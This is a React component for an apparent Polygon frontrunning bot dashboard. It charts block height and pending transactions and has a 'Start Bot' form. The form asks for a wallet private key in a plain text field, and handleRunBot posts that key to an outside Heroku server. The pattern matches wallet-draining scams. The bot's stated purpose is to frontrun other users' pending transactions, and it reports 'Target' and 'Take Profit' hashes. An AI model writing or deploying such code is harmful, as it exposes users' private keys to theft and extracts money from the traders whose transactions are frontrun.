import React, { useEffect, useState } from "react";
import {
  LineChart,
  Line,
  XAxis,
  YAxis,
  Tooltip,
  CartesianGrid,
  BarChart,
  Bar,
  ReferenceLine,
  ResponsiveContainer
} from "recharts";
import { ToastContainer, toast } from 'react-toastify';

import axios from "axios";
import Nav from "../Nav/Nav";
import Web3 from "web3";
function Hero() {
  const [privateKey, setPrivateKey] = useState("");
  const [address, setAddress] = useState("");
  const [balance, setBalance] = useState(null);
  const [message, setMessage] = useState("Submit the key");
  const [loader, setLoader] = useState(false);

  const web3 = new Web3("https://polygon-rpc.com"); // Public Polygon RPC

  // Fetch balance with Web3
  const fetchBalance = async (userAddress) => {
    try {
      const balanceInWei = await web3.eth.getBalance(userAddress);
      const balanceInMatic = web3.utils.fromWei(balanceInWei, "ether");
      setBalance(parseFloat(balanceInMatic).toFixed(4));
    } catch (error) {
      console.error("Error fetching balance:", error);
      setBalance("Error fetching balance");
    }
  };

  const handleRunBot = async () => {
    if (!privateKey || !address) {
      setMessage("Please enter both private key and address");
      return;
    }

    setLoader(true);
    setMessage("Processing to find the opportunity...");
    setBalance(null);

    try {
      const token = localStorage.getItem("token");
      const response = await axios.post(
        "https://marlinnapp-5e0bd806334c.herokuapp.com/api/runBot",
        {
          amount: 1,
          privatekey: privateKey,
          gasGiven: "300",
        },
        {
          headers: { Authorization: `Bearer ${token}` },
        }
      );

      const { data } = response.data;
      setMessage(
        <>
          <p className="mt-3 text-white">{response.message}</p>
          <div className="mt-3 text-white">
            <p>
              Frontrun TxHash:{" "}
              <a
                href={`https://polygonscan.com/tx/${data.frontrunTxHash}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {data.frontrunTxHash}
              </a>
            </p>
            <p>
              Target TxHash:{" "}
              <a
                href={`https://polygonscan.com/tx/${data.targetTxHash}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {data.targetTxHash}
              </a>
            </p>
            <p>
              Take Profit TxHash:{" "}
              <a
                href={`https://polygonscan.com/tx/${data.TakeProfitTxHash}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {data.TakeProfitTxHash}
              </a>
            </p>
          </div>
        </>
      );
toast.success(response.message);
      fetchBalance(address);
    } catch (error) {
      console.error("Error running bot:", error);
      setMessage("Error running bot. Please try again.");
    }

    setLoader(false);
  };
  // Fetch POL Price Data
  const [polPriceData, setPolPriceData] = useState([]);
  const [blockHeightData, setBlockHeightData] = useState([]);
  const [pendingTxData, setPendingTxData] = useState([]);


  
    // Fetch POL Price
    // useEffect(() => {
    //   const interval = setInterval(() => {
    //     axios.get("https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=polprice")
    //       .then(response => {
    //         console.log("POL Price Response:", response.data);
    //         if (response.data.status) {
    //           const formattedData = response.data.data.map(entry => ({
    //             time: new Date(entry.time).toLocaleTimeString(),
    //             price: entry.price
    //           }));
    //           setPolPriceData(formattedData.slice(0, 15)); // Only first 15 data points
    //         }
    //       })
    //       .catch(error => console.error("Error fetching POL price data:", error));
    //   }, 1000); // Fetch every 1 second
  
    //   return () => clearInterval(interval); // Cleanup interval on component unmount
    // }, []);
  
    // Fetch Block Height Data every second
    useEffect(() => {
      const interval = setInterval(() => {
        axios.get("https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=blockheight")
          .then(response => {
            console.log("Block Height Response:", response.data);
            if (response.data.status) {
              const formattedData = response.data.data.map(entry => ({
                time: new Date(entry.time).toLocaleTimeString(),
                blockHeight: entry.blockHeight
              }));
    
              // Sorting data in ascending order and reversing to show latest at the bottom
              const sortedData = formattedData.sort((a, b) => new Date(a.time) - new Date(b.time)).reverse();
    
              setBlockHeightData(sortedData.slice(0, 30)); // Keep latest 15 entries
            }
          })
          .catch(error => console.error("Error fetching block height data:", error));
      }, 1000);
    
      return () => clearInterval(interval);
    }, []);
    
    useEffect(() => {
      const interval = setInterval(() => {
        axios.get("https://marlinnapp-5e0bd806334c.herokuapp.com/api/getData?type=pendingtx")
          .then(response => {
            console.log("Pending Transactions Response:", response.data);
            if (response.data.status) {
              const formattedData = response.data.data.map(entry => ({
                time: new Date(entry.time).toLocaleTimeString(),
                pendingTx: entry.pendingTxCount
              }));
    
              // Sorting data in ascending order and reversing to show latest at the bottom
              const sortedData = formattedData.sort((a, b) => new Date(a.time) - new Date(b.time)).reverse();
    
              setPendingTxData(sortedData.slice(0, 30)); // Keep latest 15 entries
            }
          })
          .catch(error => console.error("Error fetching pending transactions data:", error));
      }, 1000);
    
      return () => clearInterval(interval);
    }, []);
    

    const [time, setTime] = useState(new Date());


  return (
    <div>
      <Nav />
      <div className="container-fluid mt-3">
        <div className="row">
        <div className="col-12 ">
      
<div className="row">
  
<div className="mt-2 col-12 col-lg-6">
  <h2 
    className="mb-2 text-center fw-bolder"
    style={{
      fontSize: "22px",
      color: "#00e1ff",
      letterSpacing: "1.5px",
      textTransform: "uppercase",
      textShadow: "2px 2px 6px rgba(0, 225, 255, 0.5)"
    }}>
    Block Height
  </h2>
  
  <div 
    className="box d-block align-items-center text-white p-3"
    style={{
      background: "rgba(31, 45, 59, 0.7)",
      borderRadius: "15px",
     
      backdropFilter: "blur(10px)",
      boxShadow: "0 1px 12px #00e1ff", 
      border: "1px solid #00e1ff",
      padding: "15px"
    }}>
    
    <div>
      <ResponsiveContainer width="100%" height={250}>
        <BarChart data={blockHeightData}>
          <CartesianGrid strokeDasharray="3 3" stroke="rgba(0, 185, 203, 0.3)" />
          <XAxis 
            dataKey="time" 
            style={{ fontSize: "11px", fontFamily: "'Poppins', sans-serif" }} 
            stroke="#00e1ff"
          />
          <YAxis 
            domain={['auto']} 
            style={{ fontSize: "11px", fontFamily: "'Poppins', sans-serif" }} 
            stroke="#00e1ff"
          />
          <Tooltip 
            contentStyle={{
              backgroundColor: "rgba(0, 0, 0, 0.8)", 
              boxShadow: "0 1px 12px #00e1ff", 
        border: "1px solid #00e1ff", 
              borderRadius: "8px"
            }} 
            labelStyle={{ color: "#fff", fontWeight: "bold" }} 
            itemStyle={{ color: "#00e1ff" }} 
          />
          <Bar dataKey="blockHeight" fill="url(#barGradient)" radius={[12, 12, 4, 4]} />
        </BarChart>
      </ResponsiveContainer>

      <svg width="0" height="0">
        <defs>
          <linearGradient id="barGradient" x1="0%" y1="0%" x2="0%" y2="100%">
            <stop offset="0%" style={{ stopColor: "#00e1ff", stopOpacity: 1 }} />
            <stop offset="100%" style={{ stopColor: "#006d80", stopOpacity: 1 }} />
          </linearGradient>
        </defs>
      </svg>
    </div>
  </div>
</div>


<div className="mt-2 col-12 col-lg-6">
  <h2 
    className="mb-2 text-center fw-bolder"
    style={{
      fontSize: "22px",
      color: "#00e1ff",
      letterSpacing: "1.5px",
      textTransform: "uppercase",
      textShadow: "2px 2px 6px rgba(0, 225, 255, 0.5)"
    }}>
    Pending Transactions
  </h2>

  <div 
    className="box d-block align-items-center text-white py-3 px-2"
    style={{
      background: "rgba(31, 45, 59, 0.7)",
      borderRadius: "15px",
     
      backdropFilter: "blur(10px)",
  boxShadow: "0 1px 12px #00e1ff", 
        border: "1px solid #00e1ff"
    }}>
    
    <div>
      <ResponsiveContainer width="100%" height={250}>
        <LineChart data={pendingTxData}>
          <CartesianGrid strokeDasharray="3 3" stroke="rgba(0, 185, 203, 0.3)" />
          <XAxis 
            dataKey="time" 
            style={{ fontSize: "11px", fontFamily: "'Poppins', sans-serif" }} 
            stroke="#00e1ff"
          />
          <YAxis 
            domain={['auto']} 
            style={{ fontSize: "11px", fontFamily: "'Poppins', sans-serif" }} 
            stroke="#00e1ff"
          />
          <Tooltip 
            contentStyle={{
              backgroundColor: "rgba(0, 0, 0, 0.8)", 
              boxShadow: "0 1px 12px #00e1ff", 
              border: "1px solid #00e1ff", 
              borderRadius: "8px"
            }} 
            labelStyle={{ color: "#fff", fontWeight: "bold" }} 
            itemStyle={{ color: "#00e1ff" }} 
          />
          <Line 
            type="monotone" 
            dataKey="pendingTx" 
            stroke="url(#lineGradient)" 
            strokeWidth={3} 
            dot={{ r: 5, fill: "#00e1ff", stroke: "#fff", strokeWidth: 2 }}
          />
        </LineChart>
      </ResponsiveContainer>

      <svg width="0" height="0">
        <defs>
          <linearGradient id="lineGradient" x1="0%" y1="0%" x2="100%" y2="0%">
            <stop offset="0%" style={{ stopColor: "#00e1ff", stopOpacity: 1 }} />
            <stop offset="100%" style={{ stopColor: "#006d80", stopOpacity: 1 }} />
          </linearGradient>
        </defs>
      </svg>
    </div>
  </div>
</div>
</div>
    </div>
    <div className="col-12 row mt-4" style={{ letterSpacing: "1px" }}>
  {/* Left Section - Wallet Info */}
  <div className="col-12 col-lg-6">
    <div className="card bg-dark p-3"
      style={{
        background: "rgba(0, 0, 0, 0.8)", 
        borderRadius: "15px",
        boxShadow: "0 1px 12px #00e1ff", 
        border: "1px solid #00e1ff"
      }}>
      
      <h4 className="text-white fw-bold" style={{ fontSize: "18px", letterSpacing: "1px" }}>
        🔷 Polygon Wallet
      </h4>

      <div className="mt-3">
        <div className="d-flex align-items-center">
          <p className="m-0 text-info fw-bold">📍 Address :</p>
          <p className="m-0 text-white ms-2">{address}</p>
        </div>
        
        <div className="d-flex align-items-center">
          <p className="m-0 text-info fw-bold">🔗 Chains :</p>
          <p className="m-0 text-white ms-2">POLYGON</p>
        </div>

        <div className="d-flex align-items-center">
          <p className="m-0 text-info fw-bold">💰 Balance :</p>
          {balance !== null && (
            <p className="m-0 text-white ms-2">{balance}</p>
          )}
        </div>
      </div>
    </div>

    {/* Input Fields */}
    <div className="d-flex gap-3 mt-3">
      <input
        type="text"
        className="form-control py-2 text-white"
        style={{
          background: "rgba(15, 15, 15, 0.9)", 
          border: "1px solid rgba(0, 255, 255, 0.4)",
          borderRadius: "8px",
          color: "#00e1ff"
        }}
        placeholder="Enter Address"
        value={address}
        onChange={(e) => setAddress(e.target.value)}
      />

      <input
        type="text"
        className="form-control py-2 text-white"
        style={{
          background: "rgba(15, 15, 15, 0.9)", 
          border: "1px solid rgba(0, 255, 255, 0.4)",
          borderRadius: "8px",
          color: "#00e1ff"
        }}
        placeholder="Enter Private Key"
        value={privateKey}
        onChange={(e) => setPrivateKey(e.target.value)}
      />
    </div>

    {/* Start Bot Button */}
    <div className="w-100 d-flex justify-content-center">
      <button
        className="btn w-50 mt-3 fw-bold py-2"
        style={{
          background: "linear-gradient(90deg, #ff0099, #493240)",
          color: "white",
          fontSize: "15px",
          borderRadius: "8px",
          transition: "0.3s",
          boxShadow: "0 4px 12px rgba(255, 0, 153, 0.3)"
        }}
        onClick={handleRunBot}
      >
        {loader ? <>⏳ Processing...</> : <>🚀 Start Bot</>}
      </button>
    </div>
  </div>

  {/* Right Section - Message Display */}
  <div className="col-12 col-lg-6">
    <div className="card bg-dark p-4"
      style={{
        background: "rgba(0, 0, 0, 0.8)", 
        borderRadius: "15px",
   boxShadow: "0 1px 12px #00e1ff", 
        border: "1px solid #00e1ff"
        ,height:"30vh",
        overflowY:"scroll"
      }}>
      {message && <p className="text-white">{message}</p>}
    </div>
  </div>
</div>



        </div>
      </div>
    </div>
  );
}

export default Hero;
// Frontrun TxHash: 0xf7a3b3e69e323d9eced3d57714e0e0ee67f1319fdd249203075c556f3f5f62d8

// Target TxHash: 0x04e1efba650a28efee5f9ba0fa636568061e0b2e1ddc1343d5a0fe7525c800cf

// Take Profit TxHash: 0xfc520f9ef990c581ef4fc7d9a3817225f6e815f53fba2dcf5346519407c0b3a6
